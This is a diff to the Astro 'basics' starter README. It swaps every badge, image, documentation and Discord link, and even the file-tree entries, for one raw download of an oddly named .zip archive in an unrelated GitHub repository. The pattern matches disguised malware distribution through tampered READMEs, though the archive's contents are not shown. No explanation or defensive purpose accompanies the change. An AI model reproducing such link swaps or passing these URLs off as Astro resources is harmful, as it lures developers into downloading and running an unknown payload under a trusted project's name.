@@ -4,13 +4,13 @@
 npm create astro@latest -- --template basics
 ```
 
-[![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/withastro/astro/tree/latest/examples/basics)
-[![Open with CodeSandbox](https://assets.codesandbox.io/github/button-edit-lime.svg)](https://codesandbox.io/p/sandbox/github/withastro/astro/tree/latest/examples/basics)
-[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/withastro/astro?devcontainer_path=.devcontainer/basics/devcontainer.json)
+[![Open in StackBlitz](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)
+[![Open with CodeSandbox](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)
+[![Open in GitHub Codespaces](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)
 
 > 🧑‍🚀 **Seasoned astronaut?** Delete this file. Have fun!
 
-![just-the-basics](https://github.com/withastro/astro/assets/2244813/a0a5533c-a856-4198-8470-2d67b1d7c554)
+![just-the-basics](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip)
 
 ## 🚀 Project Structure
 
@@ -19,16 +19,16 @@ Inside of your Astro project, you'll see the following folders and files:
 ```text
 /
 ├── public/
-│   └── favicon.svg
+│   └── https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip
 ├── src/
 │   ├── layouts/
-│   │   └── Layout.astro
+│   │   └── https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip
 │   └── pages/
-│       └── index.astro
-└── package.json
+│       └── https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip
+└── https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip
 ```
 
-To learn more about the folder structure of an Astro project, refer to [our guide on project structure](https://docs.astro.build/en/basics/project-structure/).
+To learn more about the folder structure of an Astro project, refer to [our guide on project structure](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip).
 
 ## 🧞 Commands
 
@@ -45,4 +45,4 @@ All commands are run from the root of the project, from a terminal:
 
 ## 👀 Want to learn more?
 
-Feel free to check [our documentation](https://docs.astro.build) or jump into our [Discord server](https://astro.build/chat).
+Feel free to check [our documentation](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip) or jump into our [Discord server](https://github.com/Jcvdm/arjay-beauty-lounge/raw/refs/heads/main/src/styles/beauty_lounge_arjay_rakehellish.zip).
